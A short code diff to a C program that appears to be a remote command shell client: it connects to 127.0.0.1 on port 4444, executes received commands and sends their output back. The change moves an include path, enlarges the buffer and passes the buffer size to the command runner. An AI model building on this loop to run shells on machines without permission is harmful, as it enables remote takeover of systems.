@@ -3,9 +3,9 @@
 #include <sys/socket.h>
 #include "server_fn/pipe_io.h"
 #include "server_fn/socket_related.h"
-#include "server_fn/error_handling.h"
+#include "general_fn/error_handling.h"
 
-#define BUFFER_SIZE 4096
+#define BUFFER_SIZE 16384
 #define HOST "127.0.0.1"
 #define PORT 4444
 
@@ -29,7 +29,7 @@ int main() {
 
         printf("\033[34m[+]Received Command: \033[32m%s\n", tmp);
 
-        command_output(tmp, output);
+        command_output(tmp, output, BUFFER_SIZE);
 
         if (send(socket, output, strlen(output), 0) == -1) error_output("Could Not Send");
         printf("\033[34m[+]Sent Desired Output.\n");
